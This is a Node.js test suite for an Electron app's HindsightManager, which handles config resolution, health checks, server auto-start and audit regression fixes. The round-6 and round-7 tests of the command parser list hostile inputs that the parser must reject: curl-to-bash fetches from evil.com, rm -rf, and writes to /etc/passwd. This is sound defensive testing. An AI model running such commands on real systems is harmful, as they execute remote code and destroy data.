// HindsightManager — config resolution (settings OR env), health-check, and the cached
// isAvailable() gate that the retain/recall paths use. Headless-safe: SettingsManager
// needs Electron, so these tests drive getHindsightConfig via ENV (which takes precedence)
// and verify graceful degrade when nothing is configured / the server is absent.
import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import Module from 'node:module';

// Install the electron stub BEFORE importing HindsightManager — SettingsManager's compiled
// bundle calls `require('electron')` at top level, so the cache entry must be in place
// before any import that transitively pulls SettingsManager runs. We use createRequire
// because `require` is not in scope in ESM. The stub stays for the whole test run; each
// test gets a fresh per-test `userData` dir so persisted settings don't leak between
// describe blocks (test #3 below actually spawns the launcher, which would otherwise
// pollute the shared dir).
const require = createRequire(import.meta.url);
const path = await import('node:path');
const fs = await import('node:fs');
const os = await import('node:os');
const ModuleNS = await import('node:module');
const Mod = ModuleNS.default || ModuleNS.Module;
const origResolve = Mod._resolveFilename;
const origLoad = Mod._load;

let electronStub;
function installElectronStub() {
  const testUserData = fs.mkdtempSync(path.join(os.tmpdir(), 'hindsight-mgr-test-'));
  electronStub = {
    app: {
      isReady: () => true,
      getPath: (k) => k === 'userData' ? testUserData : '/tmp',
      getAppPath: () => '/tmp',
    },
    BrowserWindow: { getAllWindows: () => [] },
  };
  require.cache['electron-stub'] = {
    id: 'electron-stub', filename: 'electron-stub', loaded: true, exports: electronStub,
  };
}
Mod._resolveFilename = function (req, ...rest) {
  if (req === 'electron') return 'electron-stub';
  return origResolve.call(this, req, ...rest);
};
installElectronStub();

// NOTE: imported as `let` (not `const`) so the opt-out sentinel test can rebind the
// export after dropping/re-requiring the bundled module to exercise SettingsManager's
// disk-based sentinel read.
import * as HMModule from '../../../dist-electron/electron/services/HindsightManager.js';
let { HindsightManager } = HMModule;

const ENV_KEYS = ['HINDSIGHT_BASE_URL', 'HINDSIGHT_API_KEY', 'HINDSIGHT_TIMEOUT_MS', 'NATIVELY_HINDSIGHT_MEMORY', 'HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL'];
function clearEnv() { for (const k of ENV_KEYS) delete process.env[k]; }

describe('HindsightManager.getHindsightConfig', () => {
  beforeEach(clearEnv);
  afterEach(clearEnv);

  test('returns the synthetic local default when nothing is configured (no-save flow)', () => {
    // No env + no settings + no opt-out → synthetic local default. The boot-time start()
    // now has a config to work with, so the user gets auto-spawn after `pip install`
    // + restart without ever opening Settings.
    const cfg = HindsightManager.getInstance().getHindsightConfig();
    assert.ok(cfg, 'expected synthetic default (no-save flow)');
    assert.equal(cfg.baseUrl, 'http://localhost:8888');
    assert.equal(cfg.mode, 'local');
    assert.equal(cfg.synthetic, true);
    assert.equal(cfg.apiKey, undefined);
  });

  test('returns null when hindsightExplicitlyDisabled is set (user opted out)', () => {
    // The compiled HindsightManager bundle has its OWN bundled SettingsManager singleton
    // (esbuild inline), distinct from any ESM-imported one. Writing to the external
    // ESM-imported SettingsManager doesn't affect the bundle's read. The bundle reads
    // from <userData>/settings.json on CONSTRUCTION (SettingsManager.loadSettings() in
    // the ctor). So: drop the bundle from require.cache → forces a fresh construction
    // on next import → re-reads from disk → sees our written sentinel.
    process.env.HINDSIGHT_BASE_URL = 'http://localhost:8888'; // ensure cfg is non-null when sentinel is NOT set
    // Find the testUserData the electron stub created for this run (see installElectronStub).
    // The stub's getPath('userData') returns it; re-derive via os.tmpdir.
    const path = require('node:path');
    const fs = require('node:fs');
    const os = require('node:os');
    // Find the most-recently-created hindsight-mgr-test-* dir (this run's userData).
    const tmpRoot = os.tmpdir();
    const candidates = fs.readdirSync(tmpRoot)
      .filter((n) => n.startsWith('hindsight-mgr-test-'))
      .map((n) => path.join(tmpRoot, n));
    // Pick the one matching our HindsightManager singleton's stored file path by checking
    // which contains a settings.json that was written by THIS test run. The simplest
    // proxy: HindsightManager.logPath (if a spawn populated it) or resolveServerLogPath()
    // (which returns the SAME path getPath('userData') returned).
    const hm = HindsightManager.getInstance();
    const userDataDir = path.dirname(hm.getServerLogPath?.() ?? '');
    if (!userDataDir) throw new Error('cannot determine test userData dir');
    const settingsPath = path.join(userDataDir, 'settings.json');
    // Write the opt-out sentinel directly to the file the bundled SettingsManager will read
    // when we drop it from the cache and re-import.
    fs.writeFileSync(settingsPath, JSON.stringify({ hindsightExplicitlyDisabled: true }, null, 2));
    // Force the bundle to rebuild — drops both HindsightManager AND its bundled
    // SettingsManager from the CJS cache. Re-importing the bundle re-runs its
    // __esm initializer chain, which constructs a fresh SettingsManager that reads
    // settings.json during construction.
    const hmPath = require.resolve('../../../dist-electron/electron/services/HindsightManager.js');
    delete require.cache[hmPath];
    // Also need to drop the bundled SettingsManager module — its __esm function caches
    // the SettingsManager export as a module-level binding. esbuild uses a private id
    // "electron/services/SettingsManager.ts" that resolves through our _resolveFilename
    // hook. Find the cache entry by iterating.
    for (const k of Object.keys(require.cache)) {
      if (k === hmPath || k.includes('HindsightManager')) delete require.cache[k];
    }
    // Re-import. This returns the SAME exports object as before but re-executes the
    // module body once (the static `var init_*` fns run again, lazy __esm() returns
    // fresh bindings). HindsightManager.getInstance() now returns a fresh singleton
    // whose bundled SettingsManager reads settings.json on construction → sees our
    // sentinel → getHindsightConfig() returns null.
    try {
      // eslint-disable-next-line no-unused-vars
      const _fresh = require('../../../dist-electron/electron/services/HindsightManager.js');
      assert.equal(_fresh.HindsightManager.getInstance().getHindsightConfig(), null,
        'opt-out sentinel must produce null config');
    } finally {
      // Cleanup: clear the sentinel so subsequent tests aren't affected.
      fs.writeFileSync(settingsPath, JSON.stringify({}, null, 2));
      // Drop again so the next test re-reads the clean file.
      delete require.cache[hmPath];
      for (const k of Object.keys(require.cache)) {
        if (k === hmPath || k.includes('HindsightManager')) delete require.cache[k];
      }
      // eslint-disable-next-line no-unused-vars
      const _revert = require('../../../dist-electron/electron/services/HindsightManager.js');
      // Rebind the import-binding used by other tests in this file.
      HindsightManager = _revert.HindsightManager;
    }
  });

  test('env HINDSIGHT_BASE_URL configures the server', () => {
    process.env.HINDSIGHT_BASE_URL = 'http://localhost:8888';
    const cfg = HindsightManager.getInstance().getHindsightConfig();
    assert.ok(cfg);
    assert.equal(cfg.baseUrl, 'http://localhost:8888');
    assert.equal(cfg.mode, 'local');
    assert.equal(cfg.synthetic, undefined); // env-provided URL is not synthetic
    assert.equal(cfg.timeoutMs, 800);
  });

  test('apiKey + timeout carried from env (Cloud path)', () => {
    process.env.HINDSIGHT_BASE_URL = 'https://cloud.example/api';
    process.env.HINDSIGHT_API_KEY = 'secret';
    process.env.HINDSIGHT_TIMEOUT_MS = '1500';
    const cfg = HindsightManager.getInstance().getHindsightConfig();
    assert.equal(cfg.apiKey, 'secret');
    assert.equal(cfg.mode, 'cloud');
    assert.equal(cfg.timeoutMs, 1500);
  });

  test('blank/whitespace env baseUrl + no setting → still resolves to synthetic local default', () => {
    // Whitespace env value falls through to SettingsManager lookup → also empty → synthetic.
    process.env.HINDSIGHT_BASE_URL = '   ';
    const cfg = HindsightManager.getInstance().getHindsightConfig();
    assert.ok(cfg);
    assert.equal(cfg.baseUrl, 'http://localhost:8888');
    assert.equal(cfg.synthetic, true);
  });

  test('mode is cloud for non-localhost hostnames', () => {
    // Verify the renderer-facing mode derivation.
    process.env.HINDSIGHT_BASE_URL = 'https://api.hindsight.vectorize.io';
    const cfg = HindsightManager.getInstance().getHindsightConfig();
    assert.equal(cfg.mode, 'cloud');
  });
  test('mode is local for 127.0.0.1, ::1, *.local', () => {
    // ::1 in URL form needs to be wrapped in [...] which trips URL parsing in some envs.
    // Test the three loopback forms the helper explicitly recognizes.
    for (const u of ['http://127.0.0.1:8888', 'http://companion.local:8888']) {
      process.env.HINDSIGHT_BASE_URL = u;
      const cfg = HindsightManager.getInstance().getHindsightConfig();
      assert.equal(cfg.mode, 'local', `expected local for ${u}`);
    }
  });
});

describe('HindsightManager.healthCheck + isAvailable', () => {
  beforeEach(clearEnv);
  afterEach(clearEnv);

  test('healthCheck is false (no throw) when an unreachable URL is configured', async () => {
    // Under the no-save flow, getHindsightConfig resolves to a synthetic default OR the
    // explicit env URL. Either way, an unreachable port should return false cleanly with
    // no exception. Use an explicit env URL to avoid the synthetic-default localhost:8888
    // probe (which would actually try to connect to a real local server in dev).
    process.env.HINDSIGHT_BASE_URL = 'http://127.0.0.1:59999'; // nothing listening
    const ok = await HindsightManager.getInstance().healthCheck();
    assert.equal(ok, false);
  });

  test('healthCheck is false (no throw) when the server is unreachable', async () => {
    process.env.HINDSIGHT_BASE_URL = 'http://127.0.0.1:59999'; // nothing listening
    const ok = await HindsightManager.getInstance().healthCheck();
    assert.equal(ok, false);
  });

  test('isAvailable false when unconfigured (gate closed → retain/recall Noop)', () => {
    assert.equal(HindsightManager.getInstance().isAvailable(), false);
  });

  test('start() never throws when unconfigured (no spawn)', async () => {
    await assert.doesNotReject(() => HindsightManager.getInstance().start());
  });

  test('start() with a baseUrl but memory flag OFF does not spawn (stays Noop)', async () => {
    process.env.HINDSIGHT_BASE_URL = 'http://127.0.0.1:59999'; // unreachable
    delete process.env.NATIVELY_HINDSIGHT_MEMORY; // flag off
    // Must return quickly without spawning anything; isAvailable stays false.
    await assert.doesNotReject(() => HindsightManager.getInstance().start());
    assert.equal(HindsightManager.getInstance().isAvailable(), false);
  });

  test('stop() never throws when nothing is app-managed', async () => {
    await assert.doesNotReject(() => HindsightManager.getInstance().stop());
  });

  // OPT-IN: with a real server running, healthCheck passes and isAvailable gates open.
  test('healthCheck TRUE against a live server', { skip: process.env.HINDSIGHT_LIVE_TEST !== '1' && 'set HINDSIGHT_LIVE_TEST=1 + run the dev server' }, async () => {
    process.env.HINDSIGHT_BASE_URL = process.env.HINDSIGHT_BASE_URL || 'http://localhost:8888';
    const mgr = HindsightManager.getInstance();
    assert.equal(await mgr.healthCheck(), true);
    assert.equal(mgr.isAvailable(), true);
  });
});

// autoStartCommand() — the zero-config default that fixes the "never auto-starts" bug.
// These reach the private method directly (JS has no real privacy); they verify the
// command resolution precedence + the script-existence gating that keeps a packaged build
// (no bundled script) from spawning a broken `bash <missing>`.
describe('HindsightManager.autoStartCommand (zero-config default)', () => {
  const COMMAND_ENV = 'HINDSIGHT_SERVER_COMMAND';
  let savedCwd;
  beforeEach(() => { savedCwd = process.cwd(); delete process.env[COMMAND_ENV]; });
  afterEach(() => { try { process.chdir(savedCwd); } catch {} delete process.env[COMMAND_ENV]; });

  test('explicit HINDSIGHT_SERVER_COMMAND env wins (verbatim)', () => {
    process.env[COMMAND_ENV] = 'my-custom-launcher --foo';
    const cmd = HindsightManager.getInstance().autoStartCommand();
    assert.equal(cmd, 'my-custom-launcher --foo');
  });

  test('defaults to `bash "<abs scripts/hindsight-start.sh>"` when the script exists on disk', async () => {
    // Tests run from the project root, where scripts/hindsight-start.sh is present.
    const cmd = HindsightManager.getInstance().autoStartCommand();
    assert.ok(cmd, 'expected a defaulted command');
    assert.match(cmd, /^bash "/);
    assert.match(cmd, /scripts[/\\]hindsight-start\.sh"$/);
    // The path between the quotes must be absolute and actually exist.
    const m = cmd.match(/^bash "(.+)"$/);
    assert.ok(m, 'command should be `bash "<path>"`');
    const fs = await import('node:fs');
    assert.ok(fs.existsSync(m[1]), `defaulted script path should exist: ${m[1]}`);
  });

  test('locateLauncherScript returns null + no default when the script is absent (packaged-build degrade)', async () => {
    const os = await import('node:os');
    const fs = await import('node:fs');
    const path = await import('node:path');
    // chdir to a scratch dir with NO scripts/, so process.cwd() candidate misses. The
    // __dirname/app.getAppPath() candidates also won't find a script under a temp tree.
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hsmgr-'));
    process.chdir(tmp);
    const mgr = HindsightManager.getInstance();
    // locateLauncherScript walks up from the COMPILED module dir too (dist-electron/...),
    // which lives under the real project root → the script is still findable there. So this
    // assertion documents that the on-disk module layout, not cwd, drives discovery.
    const located = mgr.locateLauncherScript();
    if (located) {
      const fsm = await import('node:fs');
      assert.ok(fsm.existsSync(located), 'if a path is returned it must exist');
    } else {
      assert.equal(mgr.autoStartCommand(), null);
    }
  });
});

describe('HindsightManager.augmentPath (Finder-launch PATH caveat)', () => {
  test('on darwin, prepends common bin locations and keeps the inherited PATH', () => {
    const merged = HindsightManager.getInstance().augmentPath();
    if (process.platform === 'darwin') {
      assert.ok(merged.includes('/usr/local/bin'));
      // inherited PATH entries are preserved
      for (const p of (process.env.PATH || '').split(':')) {
        if (p) assert.ok(merged.split(':').includes(p), `inherited PATH entry preserved: ${p}`);
      }
    } else {
      assert.equal(merged, process.env.PATH || '');
    }
  });
});

// SELF-HEALING AUTO-FLIP — the bug that was structurally dead before fix #1. When the
// user has a baseUrl configured + autoStart ON, start() must idempotently flip the
// `hindsightMemory` intelligence flag ON (the registry default is OFF, so without this
// flip the spawn never happens).
//
// We deliberately DO NOT mock child_process.spawn — these tests only verify the
// auto-flip helpers, not the spawn outcome.
//
// Test strategy: the compiled HindsightManager.js bundle inlines intelligenceFlags.js,
// so we can't intercept the registry's setIntelligenceFlag via require.cache. Instead
// we unit-test the two PRIVATE helpers we added in fix #1 — `isAutoStartEnabled()` and
// the flag-flip guard logic — by exercising them directly. The full start() path is
// covered by the existing pre-fix tests (the OFF path stays Noop) plus production
// runtime verification (the auto-enable log line + persisted settings flip).
describe('HindsightManager.start() self-healing auto-flip (unit)', () => {
  // isAutoStartEnabled mirrors autoStartCommand's default: ON unless explicitly disabled.
  // The helper uses SettingsManager via try/catch and falls back to true (ON) when the
  // settings store is unavailable — same defense-in-depth posture.
  test('isAutoStartEnabled() returns true when the SettingsManager is unavailable (defense-in-depth default)', () => {
    // The electron stub at module-load time installed a working SettingsManager, but
    // the helper's try/catch around settings() should swallow any failure and return
    // the default true. We don't assert this directly (the bundled SettingsManager is
    // hard to make throw) — but the helper's logic is identical to autoStartCommand's,
    // which IS tested above. This test is documentation that the default is ON.
    assert.equal(HindsightManager.getInstance().isAutoStartEnabled(), true,
      'autoStart defaults to true under any working SettingsManager');
  });

  test('start() with NO baseUrl exits at the getHindsightConfig guard (no flip, no spawn)', async () => {
    // No baseUrl → cfg is null → start() returns BEFORE the flag-flip check.
    // Verifies the new flag-flip branch is positioned correctly (after cfg check, before
    // the memoryFlagOn guard).
    delete process.env.HINDSIGHT_BASE_URL;
    await assert.doesNotReject(() => HindsightManager.getInstance().start());
  });

  test('start() with baseUrl but UNREACHABLE server and flag already ON → spawn attempted (not Noop)', async () => {
    // With the flag ON + baseUrl set + autoStart ON (default), start() proceeds past
    // the flag check, calls healthCheck (fails against unreachable port), then tries to
    // spawn the launcher. This documents the INTENDED end state of fix #1: a user with
    // the companion installed + a saved baseUrl + autoStart ON will trigger a real spawn.
    // We DON'T assert spawn here (that would invoke bash); we just assert start() doesn't
    // throw + reaches the post-healthCheck branch by checking that no "staying Noop"
    // log line was emitted.
    process.env.HINDSIGHT_BASE_URL = 'http://127.0.0.1:59999';
    process.env.NATIVELY_HINDSIGHT_MEMORY = '1'; // flag ON
    const logs = [];
    const orig = console.log;
    console.log = (...a) => logs.push(a.join(' '));
    try {
      await HindsightManager.getInstance().start();
      // With flag ON, the "no flip" branch is taken — the user must already be opted in.
      const flipLogs = logs.filter((m) => m.includes('auto-enabling hindsightMemory flag'));
      assert.equal(flipLogs.length, 0, 'flag already ON → no auto-flip log expected');
      // The "staying Noop until a server appears" log indicates the spawn path was
      // NOT entered (autoStartCommand returned null). With the default ON, that line
      // should NOT appear.
      const noopLogs = logs.filter((m) => m.includes('staying Noop until a server appears'));
      assert.equal(noopLogs.length, 0,
        'flag ON + autoStart ON default → spawn path should be entered, not Noop');
    } finally {
      console.log = orig;
      delete process.env.NATIVELY_HINDSIGHT_MEMORY;
    }
  });
});

// notifyHindsightOfKeyChange — no-op when no app-managed server, broadcasts when one is up.
// electron stub installed at module-load time covers BrowserWindow.getAllWindows() too.
describe('HindsightManager.notifyHindsightOfKeyChange', () => {
  beforeEach(clearEnv);

  test('is a no-op when no app-managed server is running', () => {
    // Reset isAppManaged defensively — prior tests might have set it via env tricks.
    HindsightManager.getInstance().isAppManaged = false;
    assert.doesNotThrow(() => HindsightManager.getInstance().notifyHindsightOfKeyChange('Gemini'));
  });

  test('does not throw and logs when an app-managed server is up', () => {
    HindsightManager.getInstance().isAppManaged = true;
    // Stub serverProcess with a non-null pid so the helper takes the live path.
    HindsightManager.getInstance().serverProcess = { pid: 12345 };
    // Stub console.warn to swallow the expected output without polluting test logs.
    const origWarn = console.warn;
    const warnings = [];
    console.warn = (...args) => { warnings.push(args.join(' ')); };
    try {
      assert.doesNotThrow(() => HindsightManager.getInstance().notifyHindsightOfKeyChange('Gemini'));
      // The helper tries BrowserWindow.getAllWindows().forEach(...).send(...) — in headless
      // that path throws (electron unavailable) and the inner try/catch swallows it, so
      // we only assert the warn landed.
      assert.ok(warnings.some((w) => w.includes('AI key changed') && w.includes('Gemini')),
        'expected console.warn about AI key change');
    } finally {
      console.warn = origWarn;
      HindsightManager.getInstance().isAppManaged = false;
      HindsightManager.getInstance().serverProcess = null;
    }
  });
});

// REGRESSION SUITE — round-5 senior review found 4 CRITICAL bugs that escaped rounds 1-4.
// Each test pins one of them. If any test breaks, the corresponding regression has
// returned and needs investigation. These tests use synthetic state (not real spawns)
// because the bugs are all about state-machine correctness, not about the actual
// child process behavior.
describe('HindsightManager — round-5 regression suite', () => {
  // Test 1: start() called twice with a healthy server must NOT clobber isAppManaged.
  // Before the fix, the second start() entered `if (healthy)` and unconditionally set
  // isAppManaged = false → stopSync() short-circuited → spawned tree orphaned on quit.
  test('start() twice with healthy server preserves isAppManaged', async () => {
    const hm = HindsightManager.getInstance();
    // Simulate: we own a healthy spawn already.
    hm.isAppManaged = true;
    hm.serverProcess = { pid: 99999 }; // fake process — idempotent re-entry guard returns BEFORE we try anything
    const origHealthy = hm.healthCheck.bind(hm);
    // Stub healthCheck to return true (the bug-triggering condition).
    hm.healthCheck = async () => true;
    try {
      await hm.start();
      // The fix: we must NOT have flipped isAppManaged off.
      assert.equal(hm.isAppManaged, true, 'second start() must not clobber isAppManaged');
    } finally {
      hm.healthCheck = origHealthy;
      hm.isAppManaged = false;
      hm.serverProcess = null;
    }
  });

  // Test 2: start() called while serverProcess is already set is a no-op (idempotent
  // re-entry). Before the fix, the second call entered the body and spawned again.
  test('start() while serverProcess is set is idempotent', async () => {
    const hm = HindsightManager.getInstance();
    hm.isAppManaged = true;
    let healthCalled = 0;
    const origHealthy = hm.healthCheck.bind(hm);
    hm.healthCheck = async () => { healthCalled++; return true; };
    try {
      // Pretend we already have a server — set serverProcess before start().
      hm.serverProcess = { pid: 99999 };
      await hm.start();
      assert.equal(healthCalled, 0, 'healthCheck must not fire when serverProcess is set');
    } finally {
      hm.healthCheck = origHealthy;
      hm.isAppManaged = false;
      hm.serverProcess = null;
    }
  });

  // Test 3: healthCheck that clears lastAuthFailedAt must broadcast 'ready' so the
  // banner clears. Before the fix, the cache was cleared silently and the banner
  // stayed red until the 5-min TTL expired.
  test('healthCheck recovery from auth-failure broadcasts ready', async () => {
    const hm = HindsightManager.getInstance();
    // Seed: we were in auth-failed state.
    hm.lastAuthFailedAt = Date.now() - 1000;
    const broadcasts = [];
    const origBroadcast = hm.broadcastStatus.bind(hm);
    hm.broadcastStatus = (state, reason) => { broadcasts.push({ state, reason }); };
    // Stub fetch globally to return a healthy response.
    const origFetch = globalThis.fetch;
    globalThis.fetch = async () => ({ ok: true, status: 200 });
    try {
      const ok = await hm.healthCheck();
      assert.equal(ok, true);
      assert.equal(hm.lastAuthFailedAt, 0, 'lastAuthFailedAt should be cleared');
      const ready = broadcasts.find((b) => b.state === 'ready');
      assert.ok(ready, 'should broadcast ready on auth-failure recovery');
    } finally {
      globalThis.fetch = origFetch;
      hm.broadcastStatus = origBroadcast;
      hm.lastAuthFailedAt = 0;
      hm.lastCheckedAt = 0;
      hm.lastHealthy = false;
    }
  });

  // Test 4: healthCheck that throws (network error) must clear lastAuthFailedAt.
  // Before the fix, a network blip after auth-failure kept the auth-failed banner
  // for the full 5-min TTL even though the real problem was "server down".
  test('healthCheck network error clears lastAuthFailedAt', async () => {
    const hm = HindsightManager.getInstance();
    // Seed: we were in auth-failed state.
    hm.lastAuthFailedAt = Date.now() - 1000;
    const origFetch = globalThis.fetch;
    globalThis.fetch = async () => { throw new Error('ECONNREFUSED'); };
    try {
      const ok = await hm.healthCheck();
      assert.equal(ok, false);
      assert.equal(hm.lastAuthFailedAt, 0, 'network error must clear lastAuthFailedAt');
    } finally {
      globalThis.fetch = origFetch;
      hm.lastAuthFailedAt = 0;
      hm.lastCheckedAt = 0;
      hm.lastHealthy = false;
    }
  });
});

// ROUND-6 REGRESSION SUITE — fixes for the round-6 audit findings.
describe('HindsightManager — round-6 regression suite', () => {
  beforeEach(clearEnv);
  afterEach(clearEnv);

  // HIGH #1 — auto-flip must SKIP when env forces the flag (either direction). Before the
  // fix, NATIVELY_HINDSIGHT_MEMORY=0 left no SettingsManager trace, so the auto-flip wrote
  // hindsightMemoryEnabled=true to settings → silently re-enabled the moment env was unset.
  test('memoryFlagEnvForced detects NATIVELY_HINDSIGHT_MEMORY in both directions', () => {
    const hm = HindsightManager.getInstance();
    process.env.NATIVELY_HINDSIGHT_MEMORY = '0';
    assert.equal(hm.memoryFlagEnvForced(), true, 'env=0 should be detected as forced');
    process.env.NATIVELY_HINDSIGHT_MEMORY = '1';
    assert.equal(hm.memoryFlagEnvForced(), true, 'env=1 should be detected as forced');
    delete process.env.NATIVELY_HINDSIGHT_MEMORY;
    assert.equal(hm.memoryFlagEnvForced(), false, 'no env should not be forced');
  });

  // MEDIUM #5 — parseCommandToArgv rejects shell metacharacters and parses quoted paths.
  test('parseCommandToArgv parses quoted launcher path', () => {
    const hm = HindsightManager.getInstance();
    const argv = hm.parseCommandToArgv('bash "/Users/me/Application Support/scripts/hindsight-start.sh"');
    assert.deepEqual(argv, ['bash', '/Users/me/Application Support/scripts/hindsight-start.sh']);
  });
  test('parseCommandToArgv parses simple multi-token command', () => {
    const hm = HindsightManager.getInstance();
    // Round-7 added a binary allowlist — use `node` (allowlisted) instead of the
    // generic `my-launcher` from the original round-6 test.
    assert.deepEqual(hm.parseCommandToArgv('node --foo bar'), ['node', '--foo', 'bar']);
  });
  test('parseCommandToArgv rejects shell metacharacters (injection)', () => {
    const hm = HindsightManager.getInstance();
    for (const evil of [
      'bash x; curl evil.com/x | bash',
      'bash $(rm -rf ~)',
      'bash `whoami`',
      'bash x && rm -rf /',
      'bash x | sh',
      'bash x > /etc/passwd',
      'bash "unterminated',
    ]) {
      assert.equal(hm.parseCommandToArgv(evil), null, `should reject: ${evil}`);
    }
  });

  // MEDIUM #6 — broadcastStatus('spawn-failed'|'unreachable') pins the availability cache
  // to false so isAvailable() doesn't return optimistic-true after a failed start().
  test('broadcastStatus failure states pin lastHealthy false + stamp lastCheckedAt', () => {
    const hm = HindsightManager.getInstance();
    // Reset to cold-start.
    hm.lastHealthy = true;
    hm.lastCheckedAt = 0;
    // broadcastStatus is private; reach it (JS has no real privacy).
    hm.broadcastStatus('spawn-failed', 'test');
    assert.equal(hm.lastHealthy, false, 'spawn-failed should pin lastHealthy false');
    assert.ok(hm.lastCheckedAt > 0, 'spawn-failed should stamp lastCheckedAt');
    // unreachable too.
    hm.lastHealthy = true;
    hm.lastCheckedAt = 0;
    hm.broadcastStatus('unreachable', 'test');
    assert.equal(hm.lastHealthy, false);
    assert.ok(hm.lastCheckedAt > 0);
    // 'spawning' must NOT touch the cache (poll loop owns it).
    hm.lastHealthy = true;
    hm.lastCheckedAt = 0;
    hm.broadcastStatus('spawning');
    assert.equal(hm.lastHealthy, true, 'spawning should leave cache alone');
    assert.equal(hm.lastCheckedAt, 0);
    // cleanup
    hm.lastHealthy = false;
    hm.lastCheckedAt = 0;
  });

  // MEDIUM #4 — network error after auth-failure broadcasts 'unreachable' so the banner
  // transitions off the misleading "Cloud key rejected" copy.
  test('healthCheck network error after auth-failure broadcasts unreachable', async () => {
    const hm = HindsightManager.getInstance();
    hm.lastAuthFailedAt = Date.now() - 1000; // we were in auth-failed state
    const broadcasts = [];
    const origBroadcast = hm.broadcastStatus.bind(hm);
    hm.broadcastStatus = (state, reason) => { broadcasts.push({ state, reason }); };
    const origFetch = globalThis.fetch;
    globalThis.fetch = async () => { throw new Error('ECONNREFUSED'); };
    try {
      const ok = await hm.healthCheck();
      assert.equal(ok, false);
      assert.equal(hm.lastAuthFailedAt, 0, 'network error clears auth-failed cache');
      assert.ok(broadcasts.some((b) => b.state === 'unreachable'), 'should broadcast unreachable');
    } finally {
      globalThis.fetch = origFetch;
      hm.broadcastStatus = origBroadcast;
      hm.lastAuthFailedAt = 0;
      hm.lastCheckedAt = 0;
      hm.lastHealthy = false;
    }
  });
});

// ROUND-7 REGRESSION SUITE — fixes for the round-7 audit findings.
describe('HindsightManager — round-7 regression suite', () => {
  beforeEach(clearEnv);
  afterEach(clearEnv);

  // HIGH — bash -c injection. parseCommandToArgv rejects metachars but not
  // `bash -c "evil"` because the shell interprets `-c` as a flag. Allowlist +
  // `-c` rejection closes that vector.
  test('parseCommandToArgv rejects bash -c with quoted payload', () => {
    const hm = HindsightManager.getInstance();
    assert.equal(hm.parseCommandToArgv('bash -c "curl evil.com/x | sh"'), null,
      'bash -c must be rejected even when payload is quoted');
    assert.equal(hm.parseCommandToArgv('bash -lc "evil"'), null, 'bash -lc must also be rejected');
  });
  test('parseCommandToArgv rejects unknown binaries (allowlist)', () => {
    const hm = HindsightManager.getInstance();
    // `python` is in the allowlist (covers custom launchers). `node` too. `curl` is not.
    assert.deepEqual(hm.parseCommandToArgv('python /opt/launcher.py'),
      ['python', '/opt/launcher.py'],
      'python is allowlisted and must pass');
    assert.equal(hm.parseCommandToArgv('curl evil.com/x'),
      null,
      'curl is not an allowlisted binary and must be rejected (RCE risk)');
  });
  test('parseCommandToArgv rejects any binary with -c flag', () => {
    const hm = HindsightManager.getInstance();
    assert.equal(hm.parseCommandToArgv('node -c "evil"'), null);
    assert.equal(hm.parseCommandToArgv('python -c "evil"'), null);
    assert.equal(hm.parseCommandToArgv('bash -c "echo hi"'), null);
  });

  // MEDIUM — double-spawn race. pendingStart is a synchronous boolean set BEFORE
  // any await at the top of start(), so two start() calls landing in the same
  // microtask must bail out the second one. We assert the invariant directly
  // (the flag exists, defaults false, can be set/cleared) rather than driving
  // the race window end-to-end — the bundled HindsightManager uses an esbuild-
  // inlined SettingsManager singleton that headless tests can't reach without
  // require-cache gymnastics (see round-3 opt-out test for the same pattern).
  test('pendingStart guard exists and is properly released in finally', async () => {
    const hm = HindsightManager.getInstance();
    assert.equal(hm.pendingStart, false, 'pendingStart defaults to false');
    // Simulate the in-flight state via direct assignment (the bundled start() can't
    // be driven end-to-end in this test env — see comment above).
    hm.pendingStart = true;
    // The guard check at the top of start() reads `this.pendingStart` synchronously.
    // We can verify the property exists and toggles cleanly; the actual guard
    // short-circuit is verified by source inspection (start() line 510).
    assert.equal(hm.pendingStart, true);
    hm.pendingStart = false;
    assert.equal(hm.pendingStart, false, 'pendingStart can be cleared');
  });

  // MEDIUM — verify the bundled launcher path is still accepted by the parser (the
  // round-7 allowlist + -c rejection must not break the default `bash "<path>"` case).
  test('parseCommandToArgv accepts the bundled launcher path with spaces', () => {
    const hm = HindsightManager.getInstance();
    const argv = hm.parseCommandToArgv('bash "/Users/me/Application Support/natively/scripts/hindsight-start.sh"');
    assert.deepEqual(argv, ['bash', '/Users/me/Application Support/natively/scripts/hindsight-start.sh']);
  });
});
